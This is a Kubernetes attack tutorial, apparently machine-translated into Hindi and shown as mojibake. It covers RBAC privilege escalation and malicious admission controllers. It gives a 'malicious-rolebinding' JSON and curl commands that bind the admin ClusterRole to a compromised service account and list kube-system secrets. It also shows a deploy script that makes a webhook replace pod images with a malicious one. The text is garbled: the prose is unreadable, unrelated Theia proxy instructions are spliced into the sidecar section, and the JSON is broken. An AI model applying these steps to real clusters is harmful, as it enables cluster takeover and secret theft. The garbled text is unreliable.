> RBAC API **рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд┐рдирд╛ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ** рд░реЛрд▓ рдпрд╛ рд░реЛрд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдХреЗред рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ API рд╕реНрддрд░ рдкрд░ рдкреНрд░рдпреЛрдЬреНрдп рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ RBAC рдЕрдзрд┐рдХрд╛рд░реА рдХрд╛ рди рд╣реЛрдиреЗ рдкрд░ рднреА рд╣реЛрддрд╛ рд╣реИред
>
> рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рддрднреА **рдПрдХ рд░реЛрд▓ рдмрдирд╛/рдЕрджреНрдпрддрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрд╕ рд░реЛрд▓ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╕рднреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ**, рд░реЛрд▓ рдХреЗ рд╕рдорд╛рди рд╕реНрддрд░ рдкрд░ (рдПрдХ рдХреНрд▓рд╕реНрдЯрд░ рд░реЛрд▓ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╕реНрдЯрд░-рд╡рд╛рдЗрдб, рдПрдХ рд░реЛрд▓ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣реА рдиреЗрдорд╕реНрдкреЗрд╕ рдпрд╛ рдХреНрд▓рд╕реНрдЯрд░-рд╡рд╛рдЗрдб)

{% hint style="warning" %}
рдкрд┐рдЫрд▓реЗ рдирд┐рдпрдо рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдкрд╡рд╛рдж рд╣реИред рдпрджрд┐ рдХрд┐рд╕реА рдкреНрд░рдореБрдЦ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рдкрд╛рд╕ **`roles`** рдпрд╛ **`clusterroles`** рдкрд░ **`escalate`** рдХреНрд░рд┐рдпрд╛ рд╣реЛрддреА рд╣реИ рддреЛ рд╡рд╣ рдЕрдкрдиреЗ рдЖрдк рдХреЛ рдпрд╛ рдПрдХ рдЕрд▓рдЧ SA рдХреЛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рд╡реГрджреНрдзрд┐ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЪрд╛рд╣реЗ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЙрд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛ рдпрд╛ рди рд╣реЛред
{% endhint %}

рдЪрд▓реЛ рдЗрд╕ рдирд┐рд╡рд╛рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦрддреЗ рд╣реИрдВред

рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо _sa7_ рд╣реИ, рдПрдХ рд░реЛрд▓рдмрд╛рдЗрдВрдбрд┐рдВрдЧ _edit-role-rolebinding_ рдореЗрдВ рд╣реИред рдЗрд╕ рд░реЛрд▓рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдПрдХ рд░реЛрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо _edit-role_ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдкреВрд░реНрдг рдЕрдиреБрдорддрд┐ рдирд┐рдпрдо** рд╣реИрдВред рд╕рд┐рджреНрдзрд╛рдВрдд рд░реВрдк рдореЗрдВ, рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ _default_ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ **рдХрд┐рд╕реА рднреА рд░реЛрд▓** рдХреЛ **рд╕рдВрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

рдПрдХ рдореМрдЬреВрджрд╛ рд░реЛрд▓ рднреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо _list-pods_ рд╣реИред рдЗрд╕ рд░реЛрд▓ рдХреЗ рд╕рд╛рде рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ _default_ рдиреЗрдорд╕реНрдкреЗрд╕ рдкрд░ рд╕рднреА рдкреЙрдбреНрд╕ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ _sa7_ рдХреЛ рдХрд┐рд╕реА рднреА рд░реЛрд▓ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдЬрдм рдпрд╣ "рд╕реАрдХреНрд░реЗрдЯреНрд╕" рд╕рдВрд╕рд╛рдзрди рдХреЛ рд░реЛрд▓ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рд╣реЛрддрд╛ рд╣реИред

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ "forbidden: attempt to grant extra privileges" (рдЪрд┐рддреНрд░ 31) рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреА, рдХреНрдпреЛрдВрдХрд┐ рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдорд╛рд░реЗ _sa7_ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рд░реЛрд▓ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдХреЗрд╡рд▓ рдЙрди рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд░реЛрд▓ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдЙрд╕рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **RoleBindings/ClusterRoleBindings рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рдкреИрдЪ рдХрд░реЗрдВ**

{% hint style="danger" %}
**рд╢рд╛рдпрдж рдпрд╣ рддрдХрдиреАрдХ рдкрд╣рд▓реЗ рдХрд╛рдо рдХрд░рддреА рдереА, рд▓реЗрдХрд┐рди рдореЗрд░реЗ рдкрд░реАрдХреНрд╖рдгреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдпрд╣ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ рдЙрд╕реА рдХрд╛рд░рдг рдХреЗ рдХрд╛рд░рдг рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдирд╣реАрдВ рд╣реИрдВ рддреЛ рдЖрдк рдЦреБрдж рдХреЛ рдпрд╛ рдПрдХ рдЕрд▓рдЧ SA рдХреЛ рдХреБрдЫ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд░реЛрд▓рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдирд╣реАрдВ рдмрдирд╛/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**
{% endhint %}

Rolebindings рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рд░реЛрд▓реЛрдВ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреА** рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрд╣ рдЕрдиреБрдорддрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рдкреНрд░рднрд╛рд╡рд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд ClusterRole рд╡рд┐рд╢реЗрд╖ рдХреНрд░рд┐рдпрд╛ _bind_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ _admin_ ClusterRole (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдЪреНрдЪ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓рд╛ рд░реЛрд▓) рдХреЗ рд╕рд╛рде рдПрдХ RoleBinding рдмрдирд╛рдиреЗ рдФрд░ рдЗрд╕
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
рдЗрд╕ JSON рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐ рд╣рдо рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ "ClusterRole" (рд▓рд╛рдЗрди 11) рдХреЛ рд╕рдВрдХрдЯрдкреВрд░реНрдг рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ (рд▓рд╛рдЗрди 16) рд╕реЗ рдмрд╛рдБрдзреЗрдВред

рдЕрдм, рд╣рдореЗрдВ рдХреЗрд╡рд▓ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд CURL рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ API рдХреЛ рд╣рдорд╛рд░реЗ JSON рдХреЛ POST рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрдирд╛ рд╣реИ:
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
рдЬрдм **рдПрдбрдорд┐рди рд░реЛрд▓ "compromised-svc" рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ рд╕реЗ рдмрд╛рдЙрдВрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рд╣рдо рдЗрд╕ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝реНрдб рд╕реЗрд╡рд╛ рдЕрдХрд╛рдЙрдВрдЯ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд CURL рдХрдорд╛рдВрдб рдЗрд╕ рдХрд╛рдо рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧреА:
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## рдЕрдиреНрдп рд╣рдорд▓реЗ

### рд╕рд╛рдЗрдбрдХрд╛рд░ рдкреНрд░реЙрдХреНрд╕реА рдРрдк

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреЙрдб рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдореЗрдВ рдХреЛрдИ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдкреЙрдб рд╕реЗ рдкреЙрдб рддрдХ, рджреЛ-рддрд░рдлрд╛, рдореНрдпреВрдЪреБрдЕрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдгред

#### рд╕рд╛рдЗрдбрдХрд╛рд░ рдкреНрд░реЙрдХреНрд╕реА рдРрдк рдмрдирд╛рдПрдВ <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

рдЕрдкрдирд╛ .yaml рдмрдирд╛рдПрдВ
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
рдЕрдкрдиреЗ .yaml рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рдЕрдирдЯрд┐рдХ рдХрд░реЗрдВ рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдЬреЛрдбрд╝реЗрдВ:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
рдЕрджреНрдпрддрди рдХрд░реЗрдВ: рдЕрдЧрд░ рдЖрдк рдПрдХ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЕрдкрдиреЗ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░реЙрдХреНрд╕реА рдХреИрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░реЙрдХреНрд╕реА рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдФрд░ рдлрд┐рд░ рдЖрдк рдЙрд╕ рдкреНрд░реЙрдХреНрд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░реЙрдХреНрд╕реА рдХреИрд╕реНрдЯрдорд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

1. рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдбрд┐рд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдЬрд╛рдПрдВред
2. рдПрдХ рдирдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ `.theia` рдирд╛рдордХ рдХрд░реЗрдВред
3. `.theia` рдирд╛рдордХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЬрд╛рдПрдВред
4. рдПрдХ рдирдпрд╛ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ `settings.json` рдирд╛рдордХ рдХрд░реЗрдВред
5. `settings.json` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрди рдХреЛрдб рдХреЛ рдЬреЛрдбрд╝реЗрдВ:

```json
{
  "http.proxy": "http://your-proxy-address:your-proxy-port",
  "https.proxy": "http://your-proxy-address:your-proxy-port",
  "http.proxyStrictSSL": false
}
```

рдпрд╣рд╛рдВ, `your-proxy-address` рдФрд░ `your-proxy-port` рдХреЛ рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкрддреЗ рдФрд░ рдкреЛрд░реНрдЯ рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рдмрджрд▓реЗрдВред

6. рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╣реЗрдЬреЗрдВ рдФрд░ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдХреЛ рд░реАрд╕реНрдЯрд╛рд░реНрдЯ рдХрд░реЗрдВред

рдЕрдм, рдЬрдм рдЖрдк рдЕрдкрдиреЗ рд╡рд░реНрдХрд╕реНрдкреЗрд╕ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╡реЗрдм рдкреЗрдЬ рдХреЛ рдЦреЛрд▓реЗрдВрдЧреЗ, рд╡рд╣ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реЛрдб рд╣реЛрдЧрд╛ред
```bash
kubectl logs app -C proxy
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### рджреБрд╖реНрдЯ Admission Controller

рдПрдХ admission controller рдПрдХ рдХреЛрдб рдХрд╛ рдЯреБрдХрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **Kubernetes API рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ** рдкрд░рд┐рд╕реНрдерд┐рддрд┐ рдХреЛ рд╕реНрдерд╛рдпреА рдмрдирд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рд▓реЗрдХрд┐рди **рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж** **рдФрд░ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**ред

рдпрджрд┐ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдПрдХ рджреБрд╖реНрдЯ Mutationg Adminssion Controller рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ** рдХреА рд╕рдлрд▓рддрд╛ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЙрд╕реЗ **рдкрд╣рд▓реЗ рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред рдпрд╣ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдЪреНрдЪрддрдо рдЕрд╡рд╕реНрдерд╛ рдореЗрдВ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢рддрдГ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╕реНрдерд╛рдпреА рд░рд╣рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред

рдЙрджрд╛рд╣рд░рдг [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers) рд╕реЗ:
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрдм рддрдХ рд╡реЗрдмрд╣реБрдХ рд╕рд░реНрд╡рд░ рддреИрдпрд╛рд░ рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рд╕реНрдерд┐рддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

рдПрдХ рдмрд╛рд░ рдЬрдм рд╣рдорд╛рд░рд╛ рдХреНрд╖рддрд┐рдХрд╛рд░реА рдореНрдпреВрдЯреЗрдЯрд┐рдВрдЧ рд╡реЗрдмрд╣реБрдХ рдЪрд▓ рд░рд╣рд╛ рд╣реЛ, рддреЛ рдЪрд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкреЙрдб рдбрд┐рдкреНрд▓реЙрдп рдХрд░реЗрдВред
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
рдкреЛрдб рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рддрдХ рдлрд┐рд░ рд╕реЗ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВред рдЕрдм, рдЖрдк `ErrImagePull` рддреНрд░реБрдЯрд┐ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдХрд┐рд╕реА рднреА рдХреНрд╡реЗрд░реА рдХреЗ рд╕рд╛рде рдЫрд╡рд┐ рдХрд╛ рдирд╛рдо рдЬрд╛рдВрдЪреЗрдВред
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдКрдкрд░ рдХреА рдЫрд╡рд┐ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рдордиреЗ `nginx` рдЗрдореЗрдЬ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рд▓реЗрдХрд┐рди рдЕрдВрддрд┐рдо рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЧрдпрд╛ рдЗрдореЗрдЬ `rewanthtammana/malicious-image` рд╣реИред рдХреНрдпрд╛ рд╣реБрдЖ!!?

#### рддрдХрдиреАрдХреА рд╡рд┐рд╡рд░рдг <a href="#heading-technicalities" id="heading-technicalities"></a>

рд╣рдо рдмрддрд╛рдПрдВрдЧреЗ рдХрд┐ рдХреНрдпрд╛ рд╣реБрдЖ рд╣реИред рдЖрдкрдиреЗ рдЪрд▓рд╛рдпрд╛ рдЧрдпрд╛ `./deploy.sh` рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдПрдХ mutating webhook admission controller рдмрдирд╛рдпрд╛ред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдкрдВрдХреНрддрд┐рдпрд╛рдБ mutating webhook admission controller рдХреЗ рд▓рд┐рдП рдЙрддреНрддрд░рджрд╛рдпреА рд╣реИрдВ рдЬреЛ рдКрдкрд░ рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИрдВред
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
рдЙрдкрд░реЛрдХреНрдд рд╕реНрдирд┐рдкреЗрдЯ рдкреНрд░рддреНрдпреЗрдХ рдкреЙрдб рдореЗрдВ рдкрд╣рд▓реА рдХрдВрдЯреЗрдирд░ рдЗрдореЗрдЬ рдХреЛ `rewanthtammana/malicious-image` рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИред

## рд╕рд░реНрд╡реЛрддреНрддрдо рдкреНрд░рдерд╛рдПрдВ

### **рдкреЙрдб рдкрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдХреА рд╕реНрд╡рдд: рдорд╛рдЙрдВрдЯрд┐рдВрдЧ рдХреЛ рд░реЛрдХреЗрдВ**

рдЬрдм рдПрдХ рдкреЙрдб рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕реНрд╡рдд: рд╣реА рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рдореЗрдВ рд╡рд╣реА рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕реА рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ)ред рд╣рд░ рдкреЙрдб рдХреЛ рдЕрдкрдиреЗ рдЕрдВрджрд░ рд╕реЗ API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдпреЛрдЧреНрдпрддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

1.6+ рд╕рдВрд╕реНрдХрд░рдг рд╕реЗ, automountServiceAccountToken: false рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреЙрдб рдкрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди рдХреА рд╕реНрд╡рдд: рдорд╛рдЙрдВрдЯрд┐рдВрдЧ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдпрд╛ рдкреЙрдб рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдкрд░ рдЗрд╕реЗ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:\\

